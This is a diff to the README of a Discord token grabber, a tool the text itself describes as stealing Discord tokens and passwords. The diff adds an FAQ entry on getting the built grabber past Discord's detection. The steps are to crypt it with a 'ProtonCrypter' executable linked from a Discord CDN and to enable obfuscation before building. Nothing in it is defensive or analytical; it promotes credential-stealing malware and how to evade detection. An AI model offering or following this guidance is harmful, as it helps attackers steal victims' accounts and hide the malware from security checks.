@@ -55,3 +55,15 @@ An powerful discord token grabber / discord token stealer stole discord password
 | [HideakiAtsuyo](https://github.com/HideakiAtsuyo)  | API |
 | [Stan](https://github.com/Stanley-GF)          | Code & a bit of the API | 
 | [Igor](https://github.com/IgorBataljon)           |  API  |
+
+# Once build, when i try to send the grabber, discord detect it ?
+
+- Crypt it using [ProtonCrypter](https://cdn.discordapp.com/attachments/801560257540915271/802832591106998292/Proton_Crypter.exe)
+
+- Select file etc...
+
+- Go in settings and check Obfuscation 
+
+![img](https://cdn.discordapp.com/attachments/800817099575787570/802832992727728138/unknown.png)
+
+- Come back in Main and press build
